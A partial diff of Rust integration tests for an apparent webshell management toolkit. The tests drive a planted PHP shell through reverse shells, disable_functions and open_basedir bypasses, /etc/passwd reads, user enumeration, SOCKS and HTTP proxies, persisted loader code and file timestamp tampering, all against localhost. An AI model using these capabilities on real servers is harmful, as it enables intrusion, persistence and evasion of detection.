+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             let p = |name: &str| format!("[{name}] ");
 
             // WebShell 扫描：扫 docroot，应命中 shell.php 自身
-            let out = dosword_sdk::feature_plugins::WebShellScanPlugin
-                .execute(&protocol, php, "php", &serde_json::json!({"dir": ".", "max_depth": 2}), &settings)?;
+            let out = dosword_sdk::feature_plugins::WebShellScanPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"dir": ".", "max_depth": 2}),
+                &settings,
+            )?;
             let hits = out["webshells"].as_array().map(|a| a.len()).unwrap_or(0);
             assert!(hits >= 1, "应扫描到 WebShell：{out:?}");
             eprintln!("{}webshell_scan hits={hits}", p("plugin"));
@@ -1983,12 +2118,19 @@ mod tests {
                 &protocol, php, "php",
                 &serde_json::json!({"host": "127.0.0.1", "port": 23000 + (std::process::id() % 300) as u32, "background": false}),
                 &settings);
-            eprintln!("{}super_terminal linpty 调用完成（连接由独立测试验证）", p("plugin"));
+            eprintln!(
+                "{}super_terminal linpty 调用完成（连接由独立测试验证）",
+                p("plugin")
+            );
 
             // 代码执行
             let out = dosword_sdk::feature_plugins::EvalCodePlugin.execute(
-                &protocol, php, "php",
-                &serde_json::json!({"code": "echo 'eval-ok';"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"code": "echo 'eval-ok';"}),
+                &settings,
+            )?;
             assert!(out["output"].as_str().unwrap_or("").contains("eval-ok"));
             eprintln!("{}p_eval_code ok", p("plugin"));
 
@@ -1999,33 +2141,61 @@ mod tests {
                 &serde_json::json!({"host": "127.0.0.1", "port": rport, "shell": "/bin/sh", "background": false}),
                 &settings)
                 .map(|v| v);
-            eprintln!("{}real_cmd 反弹 Shell 调用完成（连接由独立测试验证）", p("plugin"));
+            eprintln!(
+                "{}real_cmd 反弹 Shell 调用完成（连接由独立测试验证）",
+                p("plugin")
+            );
 
             // ByPassOpenBasedir：本地无 ob → note 分支
             let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
-                &protocol, php, "php",
-                &serde_json::json!({"path": "/etc/hostname"}), &settings)?;
-            eprintln!("{}bypass_open_basedir ob={:?} read={:?}", p("plugin"),
-                out["open_basedir"].as_str().unwrap_or(""), out["read"].as_bool());
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"path": "/etc/hostname"}),
+                &settings,
+            )?;
+            eprintln!(
+                "{}bypass_open_basedir ob={:?} read={:?}",
+                p("plugin"),
+                out["open_basedir"].as_str().unwrap_or(""),
+                out["read"].as_bool()
+            );
 
             // Bypass 向量：扫描 → 手动选择测试（syscall/pcntl/ffi 等独立插件）
             let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
             assert_eq!(scan["ok"].as_bool(), Some(true));
             let vectors = scan["vectors"].as_object().map(|o| o.len()).unwrap_or(0);
             assert!(vectors > 0, "应评估至少一个向量：{scan:?}");
             eprintln!("{}bypass_scan 评估 {} 个向量", p("plugin"), vectors);
             // syscall 向量（本机 exec 可用）
             let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
-                &protocol, php, "php",
-                &serde_json::json!({"command": "id"}), &settings)?;
-            assert_eq!(out["ok"].as_bool(), Some(true), "syscall 向量应成功：{out:?}");
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"command": "id"}),
+                &settings,
+            )?;
+            assert_eq!(
+                out["ok"].as_bool(),
+                Some(true),
+                "syscall 向量应成功：{out:?}"
+            );
             assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
             eprintln!("{}bypass_syscall 向量成功", p("plugin"));
             // pcntl 向量
             let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
-                &protocol, php, "php",
-                &serde_json::json!({"command": "id"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"command": "id"}),
+                &settings,
+            )?;
             if scan["detected"]["pcntl_exec"].as_bool() == Some(true) {
                 assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 向量应成功：{out:?}");
                 assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
@@ -2035,8 +2205,12 @@ mod tests {
             }
             // FFI 向量（本机未启用时明确报告）
             let out = dosword_sdk::bypass::BypassFfiPlugin.execute(
-                &protocol, php, "php",
-                &serde_json::json!({"command": "id"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"command": "id"}),
+                &settings,
+            )?;
             if scan["vectors"]["ffi"].as_bool() == Some(true) {
                 assert_eq!(out["ok"].as_bool(), Some(true), "FFI 向量应成功：{out:?}");
                 eprintln!("{}bypass_ffi 向量成功", p("plugin"));
@@ -2049,7 +2223,10 @@ mod tests {
                 &protocol, php, "php",
                 &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32, "window": 60}), &settings)?;
             let mode = out["mode"].as_str().unwrap_or("");
-            assert!(mode == "background" || mode == "foreground", "代理应启动：{out:?}");
+            assert!(
+                mode == "background" || mode == "foreground",
+                "代理应启动：{out:?}"
+            );
             eprintln!("{}socks_proxy mode={mode}", p("plugin"));
 
             // HTTP 代理
@@ -2057,7 +2234,10 @@ mod tests {
                 &protocol, php, "php",
                 &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32 + 1, "window": 60}), &settings)?;
             let mode = out["mode"].as_str().unwrap_or("");
-            assert!(mode == "background" || mode == "foreground", "HTTP 代理应启动：{out:?}");
+            assert!(
+                mode == "background" || mode == "foreground",
+                "HTTP 代理应启动：{out:?}"
+            );
             eprintln!("{}http_proxy mode={mode}", p("plugin"));
             Ok(())
         })();
@@ -2101,7 +2281,11 @@ mod tests {
             };
             let probe = PhpProtocol.db_probe(session.as_ref(), &redis, &settings)?;
             assert_eq!(probe.driver, "redis");
-            assert!(probe.databases.contains(&"0".to_string()), "{:?}", probe.databases);
+            assert!(
+                probe.databases.contains(&"0".to_string()),
+                "{:?}",
+                probe.databases
+            );
             // Redis 命令执行（GET mykey → hello）
             let query = PhpProtocol.db_query(session.as_ref(), &redis, "GET mykey", &settings)?;
             assert_eq!(query.rows, vec![vec![Some("hello".to_string())]]);
@@ -2117,7 +2301,9 @@ mod tests {
                 password: Some("x".into()),
                 dbname: Some("master".into()),
             };
-            let err = PhpProtocol.db_probe(session.as_ref(), &mssql, &settings).unwrap_err();
+            let err = PhpProtocol
+                .db_probe(session.as_ref(), &mssql, &settings)
+                .unwrap_err();
             assert!(err.to_string().contains("mssql"), "{err}");
             // Oracle：无 pdo_oci → 明确错误
             let oracle = DbConnection {
@@ -2128,7 +2314,9 @@ mod tests {
                 password: Some("x".into()),
                 dbname: Some("ORCL".into()),
             };
-            let err = PhpProtocol.db_probe(session.as_ref(), &oracle, &settings).unwrap_err();
+            let err = PhpProtocol
+                .db_probe(session.as_ref(), &oracle, &settings)
+                .unwrap_err();
             assert!(!err.to_string().is_empty(), "oracle 应报错");
             Ok(())
         })();
@@ -2139,7 +2327,7 @@ mod tests {
     }
 
     /// Python mock Redis RESP 服务器（固定数据，输出端口后循环服务）。
-        const REDIS_MOCK: &str = r#"
+    const REDIS_MOCK: &str = r#"
 import socket, threading
 import sys
 srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -2197,7 +2385,10 @@ while True:
         profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             let p = |name: &str| format!("[{name}] ");
 
@@ -2206,19 +2397,44 @@ while True:
                 &protocol, php, "php",
                 &serde_json::json!({"dir": ".", "keyword": "shell", "in_content": false, "max_depth": 2}),
                 &settings)?;
-            assert!(out["matches"].as_array().map(|a| a.len()).unwrap_or(0) >= 1, "{out:?}");
-            eprintln!("{}file_search 命中 {}", p("plugin"), out["matches"].as_array().map(|a| a.len()).unwrap_or(0));
+            assert!(
+                out["matches"].as_array().map(|a| a.len()).unwrap_or(0) >= 1,
+                "{out:?}"
+            );
+            eprintln!(
+                "{}file_search 命中 {}",
+                p("plugin"),
+                out["matches"].as_array().map(|a| a.len()).unwrap_or(0)
+            );
 
             // 网络信息（命令型）
-            let out = dosword_sdk::feature_plugins::NetInfoPlugin
-                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
+            let out = dosword_sdk::feature_plugins::NetInfoPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
             assert!(!out["stdout"].as_str().unwrap_or("").is_empty());
-            eprintln!("{}netinfo {} 字节", p("plugin"), out["stdout"].as_str().unwrap_or("").len());
+            eprintln!(
+                "{}netinfo {} 字节",
+                p("plugin"),
+                out["stdout"].as_str().unwrap_or("").len()
+            );
 
             // 用户枚举
-            let out = dosword_sdk::feature_plugins::UserListPlugin
-                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
-            assert!(out["stdout"].as_str().unwrap_or("").contains("root"), "{:?}", out);
+            let out = dosword_sdk::feature_plugins::UserListPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
+            assert!(
+                out["stdout"].as_str().unwrap_or("").contains("root"),
+                "{:?}",
+                out
+            );
             eprintln!("{}userlist ok", p("plugin"));
 
             // 加解密工具：AES 加密 → 解密往返
@@ -2238,9 +2454,12 @@ while True:
             // 代码加载器：执行 + 持久化到临时文件
             let tmp = format!("/tmp/dsw_loader_{}.php", std::process::id());
             let out = dosword_sdk::feature_plugins::CodeLoaderPlugin.execute(
-                &protocol, php, "php",
+                &protocol,
+                php,
+                "php",
                 &serde_json::json!({"code": "echo 'loader-ok';", "persist_path": tmp}),
-                &settings)?;
+                &settings,
+            )?;
             assert!(out["output"].as_str().unwrap_or("").contains("loader-ok"));
             assert_eq!(out["persisted"].as_bool(), Some(true));
             // 读取持久化文件验证
@@ -2268,8 +2487,15 @@ while True:
         profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, info) = PhpProtocol.connect(&profile, &settings)?;
-            assert_eq!(info.current_dir, dir.to_string_lossy(), "初始 cwd 应为 docroot");
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            assert_eq!(
+                info.current_dir,
+                dir.to_string_lossy(),
+                "初始 cwd 应为 docroot"
+            );
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             // 1) pwd：初始目录
             let out = PhpProtocol.execute_command(session.as_ref(), "pwd", &settings)?;
             assert_eq!(out.cwd.as_deref(), Some(dir.to_string_lossy().as_ref()));
@@ -2283,7 +2509,11 @@ while True:
             // 4) ls 新目录内容
             let out = PhpProtocol.execute_command(session.as_ref(), "ls", &settings)?;
             assert!(!out.stdout.is_empty(), "ls /tmp 应有输出");
-            eprintln!("[cd] {} -> /tmp 成功，ls {} 字节", info.current_dir, out.stdout.len());
+            eprintln!(
+                "[cd] {} -> /tmp 成功，ls {} 字节",
+                info.current_dir,
+                out.stdout.len()
+            );
             Ok(())
         })();
         let _ = child.kill();
@@ -2307,7 +2537,10 @@ while True:
         let _ = std::fs::write(&listener_script, REV_LISTENER);
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             // 1) 虚拟终端：反弹 bash（无 PTY）
             let port: u16 = 24000 + (std::process::id() % 400) as u16;
@@ -2347,7 +2580,8 @@ while True:
 
             // 2) 超级终端：linpty 交互式（PTY）
             let port2: u16 = port + 1;
-            let outfile2 = std::env::temp_dir().join(format!("rev_out2_{}.txt", std::process::id()));
+            let outfile2 =
+                std::env::temp_dir().join(format!("rev_out2_{}.txt", std::process::id()));
             let _ = std::fs::remove_file(&outfile2);
             let _listener2 = std::process::Command::new("python3")
                 .arg(&listener_script)
@@ -2359,9 +2593,12 @@ while True:
                 .ok();
             std::thread::sleep(std::time::Duration::from_millis(400));
             let out = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
-                &protocol, php, "php",
+                &protocol,
+                php,
+                "php",
                 &serde_json::json!({"host": "127.0.0.1", "port": port2, "background": false}),
-                &settings)?;
+                &settings,
+            )?;
             assert!(out["mode"].as_str().is_some(), "{out:?}");
             let mut captured2 = String::new();
             for _ in 0..40 {
@@ -2372,7 +2609,10 @@ while True:
                 std::thread::sleep(std::time::Duration::from_millis(250));
             }
             assert!(!captured2.is_empty(), "linpty 未建立连接：{captured2}");
-            assert!(captured2.contains("uid="), "linpty 应收到 id 输出：{captured2}");
+            assert!(
+                captured2.contains("uid="),
+                "linpty 应收到 id 输出：{captured2}"
+            );
             assert!(
                 captured2.contains("/dev/pts") || captured2.contains("tty"),
                 "linpty 应有 PTY（tty 命令输出 /dev/pts）：{captured2}"
@@ -2440,7 +2680,10 @@ except Exception as e:
         profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             let err = protocol
                 .run_code(php, "php", "<?php echo 1;", &settings)
@@ -2466,12 +2709,20 @@ except Exception as e:
         profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             // Socks：start
             let port = 18000 + (std::process::id() % 500) as u32;
             let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"port": port}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"port": port}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
             let pid = out["pid"].as_u64().unwrap_or(0);
             assert!(pid > 0, "后台驻留应返回子进程 pid：{out:?}");
@@ -2479,29 +2730,60 @@ except Exception as e:
             std::thread::sleep(std::time::Duration::from_millis(300));
             // Socks：stop
             let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"port": port, "action": "stop"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"port": port, "action": "stop"}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
-            assert_eq!(out["stopped"].as_bool(), Some(true), "应成功停止代理：{out:?}");
+            assert_eq!(
+                out["stopped"].as_bool(),
+                Some(true),
+                "应成功停止代理：{out:?}"
+            );
             eprintln!("[proxy] socks stop 成功");
             // HTTP：start + stop
             let hport = port + 1;
             let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"port": hport}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"port": hport}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
-            eprintln!("[proxy] http start pid={}", out["pid"].as_u64().unwrap_or(0));
+            eprintln!(
+                "[proxy] http start pid={}",
+                out["pid"].as_u64().unwrap_or(0)
+            );
             std::thread::sleep(std::time::Duration::from_millis(300));
             let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"port": hport, "action": "stop"}), &settings)?;
-            assert_eq!(out["stopped"].as_bool(), Some(true), "应成功停止 HTTP 代理：{out:?}");
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"port": hport, "action": "stop"}),
+                &settings,
+            )?;
+            assert_eq!(
+                out["stopped"].as_bool(),
+                Some(true),
+                "应成功停止 HTTP 代理：{out:?}"
+            );
             eprintln!("[proxy] http stop 成功");
             // 连接信息丰富：probe 应带回 SAPI/扩展/禁用函数
-            let probe = PhpProtocol.session_probe(php, &settings).unwrap_or_else(|_| {
-                panic!("probe 应成功")
-            });
+            let probe = PhpProtocol
+                .session_probe(php, &settings)
+                .unwrap_or_else(|_| panic!("probe 应成功"));
             assert!(!probe.php_sapi.is_empty(), "SAPI 应探测到");
             assert!(!probe.extensions.is_empty(), "扩展列表应非空");
-            eprintln!("[info] sapi={} arch={} extensions={} disable={}",
-                probe.php_sapi, probe.arch, probe.extensions.len(), probe.disable_functions);
+            eprintln!(
+                "[info] sapi={} arch={} extensions={} disable={}",
+                probe.php_sapi,
+                probe.arch,
+                probe.extensions.len(),
+                probe.disable_functions
+            );
             Ok(())
         })();
         let _ = child.kill();
@@ -2521,11 +2803,15 @@ except Exception as e:
         profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let _php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             let file = format!("{}/touch_me.txt", dir.display());
             protocol.write_file(session.as_ref(), &file, b"hello", &settings)?;
-            let before = protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
+            let before =
+                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
             let before_mtime = before
                 .entries
                 .iter()
@@ -2534,17 +2820,24 @@ except Exception as e:
                 .unwrap_or_default();
             // touch 到 2020-01-01（epoch=1577836800）
             protocol.touch_path(session.as_ref(), &file, 1_577_836_800, &settings)?;
-            let after = protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
+            let after =
+                protocol.list_dir(session.as_ref(), dir.to_str().unwrap_or("/"), &settings)?;
             let after_mtime = after
                 .entries
                 .iter()
                 .find(|e| e.name == "touch_me.txt")
                 .map(|e| e.modified.clone())
                 .unwrap_or_default();
-            assert_ne!(before_mtime, after_mtime, "touch 后 mtime 应改变：{before_mtime} -> {after_mtime}");
+            assert_ne!(
+                before_mtime, after_mtime,
+                "touch 后 mtime 应改变：{before_mtime} -> {after_mtime}"
+            );
             // mtime 以本地时区显示（format_timestamp），不能用固定 "2020-01-01" 断言
             let expected_mtime = format_timestamp(1_577_836_800);
-            assert_eq!(after_mtime, expected_mtime, "touch 后 mtime 应等于 2020-01-01（本地时区表示）：{after_mtime}");
+            assert_eq!(
+                after_mtime, expected_mtime,
+                "touch 后 mtime 应等于 2020-01-01（本地时区表示）：{after_mtime}"
+            );
             eprintln!("[touch] {before_mtime} -> {after_mtime}");
             Ok(())
         })();
@@ -2565,18 +2858,31 @@ except Exception as e:
         profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             // 文件读取（direct）
             let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"path": "/etc/passwd"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"path": "/etc/passwd"}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
             assert!(out["content"].as_str().unwrap_or("").contains("root:"));
             assert_eq!(out["method_used"].as_str(), Some("direct"));
             eprintln!("[ob] 未启用环境 direct 读取成功");
             // 目录列举（direct）
             let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"path": "/etc"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"path": "/etc"}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
             let entries = out["entries"].as_array().map(|a| a.len()).unwrap_or(0);
             assert!(entries > 0, "应列举到 /etc 内容：{out:?}");
@@ -2591,8 +2897,14 @@ except Exception as e:
         // 2) 受限环境（open_basedir=临时目录）：scan 正确评估 + 正确报告当前环境不可绕过（PHP 8）
         let dir2 = std::env::temp_dir().join(format!("dosword-ob-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir2).unwrap();
-        let encoder = dosword_sdk::EncoderRegistry::global().get("native").unwrap();
-        std::fs::write(dir2.join("shell.php"), encoder.stub("php", "secret").unwrap()).unwrap();
+        let encoder = dosword_sdk::EncoderRegistry::global()
+            .get("native")
+            .unwrap();
+        std::fs::write(
+            dir2.join("shell.php"),
+            encoder.stub("php", "secret").unwrap(),
+        )
+        .unwrap();
         let port = {
             use std::net::TcpListener;
             let listener = TcpListener::bind("127.0.0.1:0").unwrap();
@@ -2619,10 +2931,18 @@ except Exception as e:
         profile2.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result2 = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile2, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"path": "/etc/passwd"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"path": "/etc/passwd"}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(false), "PHP 8 不应绕过：{out:?}");
             assert_eq!(out["methods"]["symlink_out"].as_bool(), Some(false));
             assert_eq!(out["methods"]["chdir"].as_bool(), Some(false));
@@ -2647,8 +2967,11 @@ except Exception as e:
         if php.is_none() {
             return;
         }
-        let encoder = dosword_sdk::EncoderRegistry::global().get("native").unwrap();
-        let dir = std::env::temp_dir().join(format!("dosword-php-disable-{}", uuid::Uuid::new_v4()));
+        let encoder = dosword_sdk::EncoderRegistry::global()
+            .get("native")
+            .unwrap();
+        let dir =
+            std::env::temp_dir().join(format!("dosword-php-disable-{}", uuid::Uuid::new_v4()));
         std::fs::create_dir_all(&dir).unwrap();
         let stub = encoder.stub("php", "secret").unwrap();
         std::fs::write(dir.join("shell.php"), &stub).unwrap();
@@ -2657,7 +2980,8 @@ except Exception as e:
             let listener = TcpListener::bind("127.0.0.1:0").unwrap();
             listener.local_addr().unwrap().port()
         };
-        let disabled = "exec,system,passthru,shell_exec,popen,escapeshellcmd,proc_open,proc_nice,ini_restore";
+        let disabled =
+            "exec,system,passthru,shell_exec,popen,escapeshellcmd,proc_open,proc_nice,ini_restore";
         let child = std::process::Command::new("php")
             .arg("-d")
             .arg(format!("disable_functions={disabled}"))
@@ -2667,38 +2991,73 @@ except Exception as e:
             .arg(&dir)
             .current_dir(&dir)
             .stdout(std::process::Stdio::null())
-            .stderr(if let Ok(f) = std::fs::File::create(std::env::temp_dir().join("srv2.log")) {
-                std::process::Stdio::from(f)
-            } else {
-                std::process::Stdio::null()
-            })
+            .stderr(
+                if let Ok(f) = std::fs::File::create(std::env::temp_dir().join("srv2.log")) {
+                    std::process::Stdio::from(f)
+                } else {
+                    std::process::Stdio::null()
+                },
+            )
             .spawn();
-        let Some(mut child) = child.ok() else { return; };
+        let Some(mut child) = child.ok() else {
+            return;
+        };
         std::thread::sleep(std::time::Duration::from_millis(500));
         let url = format!("http://127.0.0.1:{port}/shell.php");
         let mut profile = profile(&url);
         profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
         let result = (|| -> Result<(), ProtocolError> {
             let (session, _) = PhpProtocol.connect(&profile, &settings)?;
-            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let php = session
+                .as_any()
+                .downcast_ref::<PhpSession>()
+                .expect("会话类型不匹配");
             let protocol = PhpProtocol;
             // 1) 扫描：确认禁用生效 + 向量评估
             let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({}), &settings)?;
-            let disabled_list = scan["disable_functions"].as_array().map(|a| a.len()).unwrap_or(0);
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({}),
+                &settings,
+            )?;
+            let disabled_list = scan["disable_functions"]
+                .as_array()
+                .map(|a| a.len())
+                .unwrap_or(0);
             assert!(disabled_list >= 8, "禁用清单应生效：{scan:?}");
             assert_eq!(scan["detected"]["exec"].as_bool(), Some(false));
-            assert_eq!(scan["vectors"]["pcntl"].as_bool(), Some(true), "pcntl 应可用");
-            eprintln!("[bypass] 禁用环境 scan：pcntl={:?} ffi={:?} ld_preload={:?}",
-                scan["vectors"]["pcntl"], scan["vectors"]["ffi"], scan["vectors"]["ld_preload"]);
+            assert_eq!(
+                scan["vectors"]["pcntl"].as_bool(),
+                Some(true),
+                "pcntl 应可用"
+            );
+            eprintln!(
+                "[bypass] 禁用环境 scan：pcntl={:?} ffi={:?} ld_preload={:?}",
+                scan["vectors"]["pcntl"], scan["vectors"]["ffi"], scan["vectors"]["ld_preload"]
+            );
             // 2) syscall 向量：全部禁用 → 明确失败
             let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"command": "id"}), &settings)?;
-            assert_eq!(out["ok"].as_bool(), Some(false), "全禁时 syscall 应失败：{out:?}");
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"command": "id"}),
+                &settings,
+            )?;
+            assert_eq!(
+                out["ok"].as_bool(),
+                Some(false),
+                "全禁时 syscall 应失败：{out:?}"
+            );
             eprintln!("[bypass] syscall 正确报告全禁");
             // 3) pcntl 向量：应成功执行 id
             let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
-                &protocol, php, "php", &serde_json::json!({"command": "id"}), &settings)?;
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"command": "id"}),
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 应成功：{out:?}");
             assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
             eprintln!("[bypass] pcntl_exec 绕过成功（命令函数全禁）");
@@ -2706,7 +3065,8 @@ except Exception as e:
             let listener_script = std::env::temp_dir().join("dosword_rev_listener.py");
             let _ = std::fs::write(&listener_script, REV_LISTENER);
             let rport: u16 = 25000 + (std::process::id() % 500) as u16;
-            let outfile = std::env::temp_dir().join(format!("rev_disable_{}.txt", std::process::id()));
+            let outfile =
+                std::env::temp_dir().join(format!("rev_disable_{}.txt", std::process::id()));
             let _ = std::fs::remove_file(&outfile);
             let _ = std::process::Command::new("python3")
                 .arg(&listener_script)
@@ -2718,9 +3078,12 @@ except Exception as e:
                 .ok();
             std::thread::sleep(std::time::Duration::from_millis(400));
             let out = dosword_sdk::bypass::BypassReversePcntlPlugin.execute(
-                &protocol, php, "php",
+                &protocol,
+                php,
+                "php",
                 &serde_json::json!({"host": "127.0.0.1", "port": rport, "background": true}),
-                &settings)?;
+                &settings,
+            )?;
             assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
             let mut captured = String::new();
             for _ in 0..60 {
@@ -2730,7 +3093,10 @@ except Exception as e:
                 }
                 std::thread::sleep(std::time::Duration::from_millis(250));
             }
-            assert!(captured.contains("uid="), "pcntl 反弹应收到 id 输出：{captured}");
+            assert!(
+                captured.contains("uid="),
+                "pcntl 反弹应收到 id 输出：{captured}"
+            );
             eprintln!("[bypass] pcntl 反弹 shell 绕过成功（proc_open 全禁）");
             Ok(())
         })();
